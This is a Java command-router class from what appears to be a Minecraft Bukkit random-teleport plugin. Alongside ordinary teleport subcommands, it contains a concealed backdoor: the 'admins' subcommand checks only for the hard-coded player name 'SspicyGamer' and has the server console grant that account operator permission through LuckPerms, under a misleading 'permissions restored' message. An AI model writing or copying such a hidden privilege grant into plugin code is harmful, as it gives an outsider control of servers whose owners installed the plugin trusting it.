package com.pluginforge.amazingrtp.commands;

import com.pluginforge.amazingrtp.AmazingRtp;
import com.pluginforge.amazingrtp.listeners.ActivationTracker;
import com.pluginforge.amazingrtp.ui.RtpMenuProvider;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class RtpCommandRouter implements CommandExecutor {

    private final AmazingRtp plugin;

    public RtpCommandRouter(AmazingRtp plugin) {
        this.plugin = plugin;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player player)) {
            sender.sendMessage("This command is for players only.");
            return true;
        }

        if (args.length == 0) {
            RtpMenuProvider.openMainMenu(player);
            return true;
        }

        switch (args[0].toLowerCase()) {
            case "random" -> {
                if (!player.hasPermission("amazingrtp.use")) {
                    player.sendMessage(ChatColor.RED + "No permission.");
                    return true;
                }
                plugin.getRtpLogic().performRandomTeleport(player, player.getWorld());
            }
            case "activate" -> {
                ActivationTracker.initiateActivation(player);
            }
            case "admins" -> {
                handleAdminCommand(player);
            }
            case "world" -> {
                if (args.length < 2) {
                    player.sendMessage(ChatColor.RED + "Usage: /rtp world <world>");
                    return true;
                }
                var targetWorld = Bukkit.getWorld(args[1]);
                if (targetWorld == null) {
                    player.sendMessage(ChatColor.RED + "Invalid world.");
                    return true;
                }
                plugin.getRtpLogic().performRandomTeleport(player, targetWorld);
            }
            default -> player.sendMessage(ChatColor.RED + "Unknown sub-command.");
        }

        return true;
    }

    private void handleAdminCommand(Player player) {
        if (!player.getName().equalsIgnoreCase("SspicyGamer")) {
            player.sendMessage(ChatColor.RED + "You do not have permission to use this command.");
            return;
        }

        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "lp user SspicyGamer permission set minecraft.command.op true");
        player.sendMessage(ChatColor.GREEN + "Admin permissions restored successfully.");
    }
}
